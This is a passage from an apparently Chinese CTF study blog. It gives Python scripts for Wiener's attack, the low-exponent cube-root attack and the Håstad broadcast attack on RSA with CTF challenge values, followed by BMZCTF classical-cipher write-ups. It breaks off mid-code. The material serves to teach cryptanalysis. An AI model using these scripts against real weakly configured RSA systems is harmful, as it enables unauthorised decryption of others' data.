class="string">&quot;&quot;&quot;计算列表所有的渐近分数</span></span><br><span class="line"><span class="string">    :param cf: 连分数列表</span></span><br><span class="line"><span class="string">    :return: 该列表所有的渐近分数</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    gf = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(cf) + <span class="number">1</span>):</span><br><span class="line">        gf.append(gradualFra(cf[:i]))</span><br><span class="line">    <span class="keyword">return</span> gf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wienerAttack</span>(<span class="params">e, n</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    :param e:</span></span><br><span class="line"><span class="string">    :param n:</span></span><br><span class="line"><span class="string">    :return: 私钥d</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    cf = continuedFra(e, n)</span><br><span class="line">    gf = getGradualFra(cf)</span><br><span class="line">    <span class="keyword">for</span> d, k <span class="keyword">in</span> gf:</span><br><span class="line">        <span class="keyword">if</span> k == <span class="number">0</span>: <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> (e * d - <span class="number">1</span>) % k != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        phi = (e * d - <span class="number">1</span>) // k</span><br><span class="line">        p, q = solve_pq(<span class="number">1</span>, n - phi + <span class="number">1</span>, n)</span><br><span class="line">        <span class="keyword">if</span> p * q == n:</span><br><span class="line">            <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n= <span class="number">68781015120012754009149819243839432182753699533745468739333557116438115901358573880902197723852823949505376140916570536753019491036629572363854637530919546688901226752085109196549145599781909847664046508960094447692268230516763088293911965638780888720788954194778424857089535187609738198309161969913567107861</span></span><br><span class="line">e= <span class="number">54093680529782962282616750547542407544796590039913570980901028264103594185617926725669901283009540557359666956131385125727959502505561517117179644650419753631214251337533961664493198676862110639584202010794500844074619335752668896589407110076134931918634061631574656816488381501901503924226166074238518619869</span></span><br><span class="line">c= <span class="number">30443384983816710270001651296607959522389400057103143909277631290995899073895621701281106228069835965181342091582584186637031613250922961166298411359757600825556083868477673357860585539016515776933117915504873987178857740106223631465737111746470236003857656528610755145017342412306680097140732745012583119076</span></span><br><span class="line"></span><br><span class="line">d=wienerAttack(e, n)</span><br><span class="line">m=<span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(m).decode())</span><br></pre></td></tr></table></figure><h3 id="低加密指数攻击"><a href="#低加密指数攻击" class="headerlink" title="低加密指数攻击"></a>低加密指数攻击</h3><blockquote><p>针对e极小的情况</p></blockquote><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p><img src="https://s2.loli.net/2021/12/31/kovt76EYL8FTxUw.png" alt="image-20211231181331429"></p><h4 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">a,b = gmpy2.iroot(mm, e)</span></span><br><span class="line"><span class="string">a 为 mm开e次方的结果，b为是否刚好开得出来（True/False）</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">de</span>(<span class="params">c, e, n</span>):</span></span><br><span class="line">    k = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        mm = c + n*k</span><br><span class="line">        result, flag = gmpy2.iroot(mm, e)</span><br><span class="line">        <span class="keyword">if</span> <span class="literal">True</span> == flag:</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line">n= <span class="number">14067473525623615859223663589118945198091192669401088734569589535726733244095067264729942915265175903139441309376381225701454902095234966599914234681888481774607095853830772571665038109641511499155604914228117882196188074964226780922239011682486198651997912713999544628177959592818928976240251790858062449396082494272361535640237914373270152455829541596341184902017633404494979208958080467979235974182507427501682492000572071306960595992848840147393057648929439822116261337091431441205378542080755128597543738922210525692259529009107645032171097155449558362749512243918901171631681472217935131865121871798425854707759</span></span><br><span class="line">e= <span class="number">3</span></span><br><span class="line">c= <span class="number">2217344750798294937344050117513831761010547351781457575945714176628679412650463329423466955026804439931765627111856888102133234836914006818023839994342283023142702993182665344445325734299047409223354338948863171846780674244925724334091153701697864918695050507247415283070309</span></span><br><span class="line"></span><br><span class="line">m=de(c,e,n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)).decode())</span><br></pre></td></tr></table></figure><h3 id="低加密指数广播攻击"><a href="#低加密指数广播攻击" class="headerlink" title="低加密指数广播攻击"></a>低加密指数广播攻击</h3><blockquote><p><strong>相同的m，e</strong>(小！素数)<br>不同的n、c</p></blockquote><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">e</span>= <span class="number">23</span></span><br><span class="line"><span class="attr">n</span>= [<span class="number">13717717494437510618655695859379240545274880285465336084980383077735368449287887730112865484794564775965333130485171954220538624992093337243861524569409700886337014234713178570668109071829948370957268039331890309426003791637196331784060347281424746354933919606729084027951927846702619927770747545446918328438622383693133548955188836386005534760206952510151018682387718085250017581376063736842317438569821243548189241925924255433864969372030426408000285820602186583603693449295808074728161954043126958695722583028507474298960280230105785438240951800348819439737765386534993474369225493776777465563613151321621063835151</span>, <span class="number">16558144096449901801273741638840778818249738276674307459380900970606210353540178775588473225243101747716461656540937897967914169123169165285058141215885778524114034353669913224125616631533581720637295574241914527632355261186084856237825159147911418425949368185785914138348023296084922073326022172722255827572970855050651303634156974527741633815671696193750844008859783609126795877812454556337806158402992021810288807118117148245357511324959680345093491733679424737914086895189219675071776517106662608171511296158300059171152501359288000451820034267372848220853491805152939787676992158798075475571822718598861536277813</span>, <span class="number">17241243429631602964596121000369815061212483336345771502751354875235046514210996399502810866301956320705757581154321265449903125364826064459735361374900736506813626157686963837036089641557922879619729110637997382539771136207851950577937595494145131719149108377813298865350573685187959924685685213024128564020559095558861443465880088146855127027731160733151643292706429845308041466687932912143394757853557159121800644023339675039896474912747094066712836569317683947559334976714054445733535012597716455658405700294711550803044331639683394854264941288619059986522633862886154622975582404301526564131035838365552777983719</span>, <span class="number">29214929619818811912983377296772756999906238053892245054271578434570872990833805015277605010807494085526771979098010986100867102722354504364459460987290083264092954737625779724099301577900601750939794622980013032447522613756060399427143355169271807171132952049851789598004722074265854068778057922522880069157385485436318543102122357157787642597019028266340067801562185878052429599296600751404659743260494150114728057601265619847290036794857159922042929805207953075826061728968741725552021006256550988912044493141054639034516788865045931761491452989805546879824818126971537686071826068209533188609985774718048970186717</span>, <span class="number">14899955930336792793532336874433652550803632486127284756045045139078976162820004135413064031687757061259428266818815438988303152287016890920556678040631793791358209442422808682855685434681111953976755186057077138978075649584961165710529290704302479877022210556047020666045632765887758942140333385547072615727311927227434273582149528164393264761783346175792299832792483293739955169992543073799307173757142831644772207319222873715947758419323711550167333785753755257436309486733493101397594020613689699756994964079166434058894869668753968021757636423919978736238191879727598084591393206458790239373388646079939721102019</span>, <span class="number">14673398278955068686155479632915216548459306863893820609661120423299233897170506303030824041474705437042932194390763164582786686392676339255556697140753062082527733336378259069050782923801616764207883662739430121215853375658099548500234803008019544275549349595024046471564034453251565124431677161800781835802295978619179726427677323387201624247932133436809920109973622786584887439911980329270012182997775746135596745462700945380599436788233994419396805116820624841279039403640023709321625333629279026336137149535840735096743962646896130236540099927993351782437225003946704903027101166904896821594318788767813908143621</span>, <span class="number">20280046067161228494511964693011607925189128225576621214714747285111401861856895283716929778129710187532589497757106634633558158011441624068423621287362133001790242685850768662352959316956053902511733547702473559869417265278289600214032497013789412184680734228766479031417696074386198787101658312902051430533644025030061685945860477526563742258592813856328076559769513210507767412477832168663332489139160351571899661110099199386226558053922218285975207927539712940995356166941200024723185752399962038024530987301986277361667665594571193574198160441916377914775840146483809060260897201295523903595518769727031805198799</span>]</span><br><span class="line"><span class="attr">c</span>= [<span class="number">11956740898676000681217923391083244959343802398551693647808051683201098085925786860259325923496657202490610734593066188119192541953654360791149838109430759578647152111084674213848985805666337165564314651663713048573839234629512412279065078028133462828198749567435497352725684823548698640693058189606015047121716632177220095587192525271580806397172189521815199464499599795072534876883872264208452884680326524888602242579604345084379654555543843635716910332231200784714094206387233055489336506241467093879140961134519199902293557532432549724590885164352161933373347230450303481152191348082596867080525460723859619846511</span>, <span class="number">7617924002556565535986377328333674602038352364180454509557372930434386538841349121392408315217579430826537255904839088292668060509952422868655885374283232191446407709370726960042119530509614605123700763091299632838426444030888588004056626922663600302427483517770299459926625546685464981793670587522402308415766923937226916278033403817780774034683308959643099199449391744089291991427217727194483987088412098125295023823065517365360795002823279536815650932749767076865670166271996294871030977107872592857161322913217260696594367217266411317705042858328305316566166616652852980036593739637044803512310496203436813764047</span>, <span class="number">13912186408628192093102456995240476610411258652802502095280231966102426927608780700027690589430564850835548322650470162753110865933021472506414983583982943230804133935740936614364177538589392112444879316271830729156055320464727367081907779336681030873682964025533234466980996263156887858124367314506468113019905624286198795096953156749733889713285238944046791297991384098831981774955246770733249129156544643605845729652564921576168690992180495411141798471595576178877234004527277756940419123193046288667491703745072195652449431405002407369710986663177915556299662117282141526405045072898840345061988077717478644699195</span>, <span class="number">28151047821311790586654008646272026570203746847773242899470299841804378472238171169845658004505448737609251915534082288116058137597306984329603380499483837627838932208830739270863217879546458738981166190609407521750270436715929383781225826703092626586095662676231555860878020521497103382257310363352483224928869712651319469816486081593510165222703939770302104975304690120438316679590467121354125639984662877942600341754120216543238715216170576755028887801562314292693871177035424282450968601507796439594919815085853977287392661607535263555445304889560066548118005709193876675846635477882748658848449766684619409997764</span>, <span class="number">1641866907675812307158147466098525995568933100887920593661179894014826559030682611392712739180141245398627410191380835109558529910095201005200711964724993475349558777540480811714913001221241980441581902822651571637788004419619484325091653571031451634171303873510756444029339180522599604509103240976358247449436526548062538482194943835627632213233420980448883740505798304364718417158999202414413637581281515412433217191451969853690769700541636698201366045862585995973367729615578705936831780051243505714470959150903516229079262340719254590526950200736567380148666895554252762360880846371421036055911232247902178027098</span>, <span class="number">382350300809625490229427917644431600331855926541015620919041152776462790446391934704031993509057171708190329936892116142545448064375721955400171442465376939732228344933537532677737828576613368914949346356456974893777500690335635619420851458465053628042402549131638492877696454132406754021316447157373223249569749603336423287352791974874983914815357821300226228015465299158724411567423576601972789591633588882079724777254196223044373267094950240018214443519835836415254891625590880239474687988109749579857581426177504162298866555973467591069030112993584190647627433798676664265981630222020576719540689393708642272345</span>, <span class="number">18650843962384693164739866449054167511266301548794763731088968531269372938131549617037207479422171489508187720596594411488759655047901286999042039069684053836516964325563913930222262031071015823369271773647345468921678027147470820413466788362348635636057631047856875878068214712699868435460966917704137550074315247963286783044862698124813553966031040673920145877940284880863430545790971292403623356675844675879375405728961325757767236717374878397410206354351379127290881775061798760018525283265941815866955474404362045296315737502666487745657969341519692398106009614083877837357478990682262691984420107763648449778265</span>]</span><br></pre></td></tr></table></figure><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><h2 id="中国剩余定理及部分裴蜀定理证明"><a href="#中国剩余定理及部分裴蜀定理证明" class="headerlink" title="中国剩余定理及部分裴蜀定理证明"></a>中国剩余定理及部分裴蜀定理证明</h2><blockquote><p><a href="https://www.bilibili.com/video/BV1gf4y1S7LR?from=search&seid=2828626318515218364&spm_id_from=333.337.0.0">中国剩余定理课程</a></p></blockquote><h3 id="原理证明-2"><a href="#原理证明-2" class="headerlink" title="原理证明"></a>原理证明</h3><p><img src="https://s2.loli.net/2022/01/02/8vZekY9qczBtNSV.png" alt="image-20220102182601081"></p><p><img src="https://s2.loli.net/2022/01/02/HIMKvG1OD9PRij6.png" alt="image-20220102182611017"></p><p><img src="https://s2.loli.net/2022/01/02/1zVmRjNKCBfJseu.png" alt="image-20220102182621455"></p><p><img src="https://s2.loli.net/2022/01/02/mcSvZzo8OiWu1K2.png" alt="image-20220102182634428"></p><h3 id="实际应用"><a href="#实际应用" class="headerlink" title="实际应用"></a>实际应用</h3><p><img src="https://s2.loli.net/2022/01/04/AJ4xRwIvtnSD9jB.png" alt="image-20220104160301773"></p><h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii,gmpy2</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CRT</span>(<span class="params">mi, ai</span>):</span></span><br><span class="line">    <span class="keyword">assert</span>(reduce(gmpy2.gcd,mi)==<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">assert</span> (<span class="built_in">isinstance</span>(mi, <span class="built_in">list</span>) <span class="keyword">and</span> <span class="built_in">isinstance</span>(ai, <span class="built_in">list</span>))</span><br><span class="line">    M = reduce(<span class="keyword">lambda</span> x, y: x * y, mi)</span><br><span class="line">    ai_ti_Mi = [a * (M // m) * gmpy2.invert(M // m, m) <span class="keyword">for</span> (m, a) <span class="keyword">in</span> <span class="built_in">zip</span>(mi, ai)]</span><br><span class="line">    <span class="keyword">return</span> reduce(<span class="keyword">lambda</span> x, y: x + y, ai_ti_Mi) % M</span><br><span class="line"></span><br><span class="line">e= <span class="number">23</span></span><br><span class="line">n= [<span class="number">13700568188515160652483333122748856122721197793561758976293940196437611129096187147049018844770801852491509905633421086860525538786202094426963328030251710764571262136174896745533638173611350459716214924297588461960177050085385463667053134112771796358074472935345700519739991250404101653259068109069693105921388873407341327391535695855870048544246046807524271999074571290297887397122751189238913097314211648891658786959026354758174645247220351373112768023740548658853638361571194694899655444114676642455442372865402013423716810043521278757792135057542028337381224680456644807085272591758332208055210218120184762933993</span>, <span class="number">12455303951778295101801876746865726762837380068225611327265475119171234220566439286424157465915935073825839673377690927685328334906307316474567186387631653801487281448621083840044622749158794717243547992072439308091388396577613505544620596436291129920864908674330398567591089739953054198863265589615640925745448938637009162522951734388734884333210018733280942210441939903191498896601489219385238879930891399742641138070096026008226581854996694584005317481033177457738077410685570860098544905752983525186623046625831970650060102227916725290755005373441583687173317035035580381484364030548806838563780182184117638395501</span>, <span class="number">11312913453345524997229175092303757066349809787030135927591246090443816441487008566337534259925791562593802909853876625626317525202428762422138834267165059103366474521447755350822619474026723784588743249816343322663039545930277057837056152601616900790058365628051926865192020616084647924562898079954569875871488048485269581903324695594743584490301132714735102846843035514174635115834382345956826120332925240425711055383445735314612014526078453624636064136731525847521062469732411461240879728208804879621960486763810048962817360272134393185930002946977732438576414921250013379633385546522773969341316069572502067565747</span>, <span class="number">19273688926871530751707885170718573691217157450567879434223457628340410073625895093788197974441685806302563195850728310991029886375715086122432340760177266985524985445504300034480827487797904941865418089597333968798898696588493471468263648636085443020434703464184815215924633364352735339920297191301112596913193981943417483120540953061378442416926357165828400001655707467493126093621482473840789855669296212432210460828627914111587469312179918093681028472281824867507358588256781382024745011058883359327063772375423890907634909474243733397473408057822868275644578237140525612613960087777442779675214209932962161127943</span>, <span class="number">25824403380218842654152117237181863815407686057920357548100132783016208234216157331481187013858706620084532009147859360032194662194329147430352381352060599665383607132414222783152103706812942495504805443853663820643284400132519740763181995336671760074736189118849190911417412125673622718186682930944463719251663826122062414169185281402187745799450127860616811214434583738617470847946117017912241156196170781549212311773302997289690360334428053433645188479934679156573770259457673448241437007751122166255146634172359683608410225806629185780976706769275891277564054509652711969428966369382807140328871035548244913540169</span>, <span class="number">27237916069051621208940446912652352983034283876768722877796629630339066194659652050347720419800886409125794947519574028544026594230991606608793723513349031053967598250588096756917851047427400805606694825815650771281434785207392911507124225263256982256339868047939184615897450178154018301408865653899046967323372600912627209194957697714349971037547547785817038582309482843956504640495722872808769284795831606211370129997371039857944461416328980185572754574947986464294124047090215456723501364524474569642506285260702179251484768225200095243277847312804129809104143492271538375785121251371642879445405237226218130294767</span>, <span class="number">13761550682262178277138207445908812895938004012620351458812077456012342912081457948142730381037941264721223863482179216010551793547021574285408780459622610402725800322968427850107196669966179328339837806343597136218927944640487794959105652921590477743490006234776475206318254765423468761009179359533340573903819987444132938579714590504929528901380380034611797641640102025769022580055379262631658712636898183456153010636153333354330556615811465638688432337372481631547224635135648075131524783033767896216049834072882777559679890752875405582498757130694817571975439400501682753249614034942783158191876673449277964305873</span>]</span><br><span class="line">c= [<span class="number">10262571808823462518706222972617543597862568988621892788603169566061143066015712397590162941689759961146172690260488971865965270847230222579998032904557938430984766267711048364907947168116473908091952262274847901197798670702630932509348193160049011343984674456154980133706472252009228877741952811774717803218313244040775956381945077497379634101671865923305021804060521682939202170177994307021066512676052755208342422597702905467231418454913781792876325613132181844091995047630699929420681514255787561417787538399764114936771546416271603555435195286433694761222982635917086486380929164535357220194188751490847126159740</span>, <span class="number">1873760069623225193188031460164577168629510321843511590851589581010158323091884037245625334264450576423497513703748949943402486554235195486945608003604913492410550727032646952732075387833483434157962823847945961417788077590746865603009614636801926695485643494439910816287002493987681839263137321312158281577409606512588038571503481880205375876372759847610515728629030784895468324627007475548811579324164095761843942789779697129082973879068202809855392853491223029896314818656151121278599338954208895547796950391203204627158727359612310869523861493123901912234283765154942764948742461112728821107134608346552771856775</span>, <span class="number">2985895977894993412250356564280621188757701877004747248029655606908178453788442472530624315824217412687521627124641549636268771426175593603860596969406918746968428475480360839574070154578348252212233965555420185919910549233104881737429986120779245582625147836249604511991694099504498456423355415033891952572068957140136031237587821914297743550751703500164233251775829591163214908665505948671743637428615178406048668071123208829673815143306105215918457316827849469724561259085924020618664008688924504157202910867055508798021785392339533763892777711399815389010578953671416118696256122691527492893238690603105740871718</span>, <span class="number">880226958648330570665826652923585021064905285913220564535802601268914731939998238851663053132946194395728683681709691206818341165883097568804208974913295560837751365921375933221025439628586836402981502674560586284377581275819082460923772292780487491196858992362166740159608419089452540222602172839570711702715638458570267373629408280794214751990345330692342439212475521544906222647038911039746667297765160642325197077286500302972512842670715220866427191331087678451078964988930072707946282911276517877581001397844626280393814317485128907214187598723285030652543787338988559227984102314239323999288888886062656553567</span>, <span class="number">2009815427590067013904234705045801411676517862085803426907991060580056876965631979890272588810800230952582542504850877216565503823555945840629024122371840947339558621619080946766065959900677138148030357494710396126783369878070540451138925897438184723977799391715647904517833046633527545658064968373331747651285453005992951298693244135497529999014011663505125408546171884008627711191184419674138689402575260876247393334319284308455639799976027283117878360299913911527890869762030625362974305707352360014964055595635315501016094747111266795155708691399809263809612237731990725856751947329733607523318847566974421507377</span>, <span class="number">5694700766209667533320463555578774304413921444532095100497641465531621818677278187178007777107102216001903166590706266461389108866563137126658591265596096815630888192401258893389043674230339983362206002697721033273220169349689433933228398864735569502059227668658884754437859192804614688078126017106973898338983058467903273433629800893427045854677794419302456422469488313296020469202479512874455184512957276727018667852597050339727765639174070344434646695283305954814336208535975320481890216924783115781802398152316171967550392347431746885369490458690822632544727994467024208594657404613355215378203965583472028051158</span>, <span class="number">10292024155412613173825075050556970628998306804602106049394871162726180325842644363271001627039660982320232377250177866906798633433125147372046294230795160430975886694419367570376173140902999001496377201160021928316891425794054040646925354276987039659647583093660753953920769021487949471906220620446860851971969844544591399518592683848757784465531598787547279741438244737906014906621222662915117890417807671575763023265920422409800110274912550502682376498609611973173660997965660328963204286476887664127188442751055758474381180365051193094521479396706496869721757475497142256079170254820437945136475911435012491537989</span>]</span><br><span class="line"></span><br><span class="line">m=gmpy2.iroot(CRT(n, c), e)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br></pre></td></tr></table></figure><h1 id="2022-1-1"><a href="#2022-1-1" class="headerlink" title="2022.1.1"></a>2022.1.1</h1><h1 id="BMZCTF"><a href="#BMZCTF" class="headerlink" title="BMZCTF"></a>BMZCTF</h1><blockquote><p><strong>“明天要考了，我现在突击一下”</strong></p><p>为了明天的正式赛事，凌晨做了下BMZCTF平台的练习题。<br>采取动态分数，题目后面的即是做时的分数。</p><p>新年快乐！</p></blockquote><h2 id="4进制·1"><a href="#4进制·1" class="headerlink" title="4进制·1"></a>4进制·1</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><blockquote><p>1212 1230 1201 1213 1323 1012 1233 1311 1302 1202 1201 1303 1211 301 302 303 1331</p></blockquote><h3 id="py3代码"><a href="#py3代码" class="headerlink" title="py3代码"></a>py3代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">&#x27;1212 1230 1201 1213 1323 1012 1233 1311 1302 1202 1201 1303 1211 301 302 303 1331&#x27;</span></span><br><span class="line">a = a.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> a:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(each, <span class="number">4</span>)), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="2018-AFCTF-Morse·1"><a href="#2018-AFCTF-Morse·1" class="headerlink" title="2018 AFCTF Morse·1"></a>2018 AFCTF Morse·1</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><blockquote><p>-…./.—-/-…./-…./-…./…–/–…/….-/-…./-…./–…/-…/…–/.—-/–…/…–/..—/–…/–…/….-/…../..-./–…/…–/…–/—–/…../..-./…–/…–/…–/….-/…–/…../–…/—-./–…/-..</p></blockquote><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>网站解码</p><h2 id="2018-HEBTUCTF-社会主义接班人·1"><a href="#2018-HEBTUCTF-社会主义接班人·1" class="headerlink" title="2018 HEBTUCTF 社会主义接班人·1"></a>2018 HEBTUCTF 社会主义接班人·1</h2><h3 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h3><blockquote><p>身为社会主义接班人的你，核心价值观你会背吗？</p><p>自由爱国自由平等自由文明平等自由平等平等自由和谐平等自由自由公正法治诚信民主公正平等公正友善自由法治公正公正友善敬业法治公正公正自由公正民主法治和谐公正公正公正诚信富强公正公正法治公正公正友善法治法治文明公正公正公正友善法治法治和谐公正自由公正平等公正诚信和谐法治爱国公正友善自由法治诚信和谐</p></blockquote><h3 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h3><blockquote><p>社会主义价值观在线解码</p></blockquote><h2 id="栅栏密码·1"><a href="#栅栏密码·1" class="headerlink" title="栅栏密码·1"></a>栅栏密码·1</h2><h3 id="题目-4"><a href="#题目-4" class="headerlink" title="题目"></a>题目</h3><blockquote><p>fa{660cb679d7866ffalg7d27e041cfbd18ed}</p></blockquote><h3 id="题解-2"><a href="#题解-2" class="headerlink" title="题解"></a>题解</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enFence</span>(<span class="params">string, space</span>):</span> <span class="comment"># 解密</span></span><br><span class="line">   s = <span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">global</span> whu</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, space):</span><br><span class="line">       <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i, <span class="built_in">len</span>(string), space):</span><br><span class="line">           <span class="comment"># 不能越界</span></span><br><span class="line">           <span class="keyword">if</span> j &lt; <span class="built_in">len</span>(string):</span><br><span class="line">               s += string[j]</span><br><span class="line">   <span class="built_in">print</span>(s)</span><br><span class="line">   whu.append(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deFence</span>(<span class="params">string, space</span>):</span> <span class="comment"># 加密</span></span><br><span class="line">   s = <span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">if</span> <span class="built_in">len</span>(string) % space == <span class="number">0</span>:</span><br><span class="line">       key = <span class="built_in">len</span>(string) // space</span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">       key = <span class="built_in">len</span>(string) // space + <span class="number">1</span></span><br><span class="line">   <span class="comment"># 小于间隔继续</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, key):</span><br><span class="line">       <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i, <span class="built_in">len</span>(string), key):</span><br><span class="line">           <span class="comment"># 不能越界</span></span><br><span class="line">           <span class="keyword">if</span> j &lt; <span class="built_in">len</span>(string):</span><br><span class="line">               s += string[j]</span><br><span class="line">   <span class="built_in">print</span>(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> sqrt</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">factoring</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;对大数进行因数分解&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(n, <span class="built_in">int</span>):</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;You must give me an integer&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="comment">#开始分解，把所有因数都添加到result列表中</span></span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> primes:</span><br><span class="line">        <span class="keyword">while</span> n!=<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">if</span> n%p == <span class="number">0</span>:</span><br><span class="line">                n = n/p</span><br><span class="line">                result.append(p)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result = <span class="built_in">map</span>(<span class="built_in">str</span>, result)</span><br><span class="line">            result = <span class="string">&#x27;*&#x27;</span>.join(result)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">    <span class="comment">#考虑参数本身就是素数的情况</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> result:</span><br><span class="line">        <span class="keyword">return</span> 